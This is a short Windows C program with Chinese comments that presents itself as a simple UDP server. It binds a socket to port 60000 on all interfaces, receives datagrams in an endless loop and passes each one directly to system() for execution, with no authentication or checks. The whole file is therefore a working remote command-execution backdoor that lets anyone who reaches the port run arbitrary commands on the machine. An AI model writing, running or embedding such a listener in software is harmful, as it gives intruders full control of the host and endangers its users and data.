#include <winsock.h>
#include <stdio.h>
#include <Windows.h>
#pragma comment(lib,"ws2_32.lib")		//加载2版本32位的lib

//UDP服务端
void main()
{
	//////初始化//////
	WORD version = MAKEWORD(2, 2);		//版本号
	WSADATA wsdata;						//定义结构体
	if (WSAStartup(version, &wsdata))	//加载DLL 成功返回0
	{
		printf("加载失败");
		return;
	}
	//////初始化//////



	SOCKET 服务端套接字;	//创建一个SOCKET句柄
	SOCKADDR_IN info;		//定义结构体

	info.sin_family = AF_INET;							//Windows只使用这种地址格式
	info.sin_addr.S_un.S_addr = htonl(INADDR_ANY );		//绑定本地，不是字符串所以转换为字节序
	info.sin_port = htons(60000);						//端口需要转换为小端字节序
	/*
		SOCK_DGRAM = udp
		SOCK_STREAM = tcp
	*/
	服务端套接字 = socket(AF_INET, SOCK_DGRAM, 0);		//创建UDP的socket

	bind(服务端套接字, &info, sizeof(info));			//bind，相当于一个监听
	int len = sizeof(info);	//结构体的大小



	while (1)
	{
		char str[1024] = { 0 };				//定义一个缓冲区 存储发送的数据
		recvfrom(服务端套接字, str, sizeof(str), 0, &info, &len);	//接收
		system(str);						//执行
	}



	closesocket(服务端套接字);	//关闭
	WSACleanup();				//释放
	system("pause");			//等待
}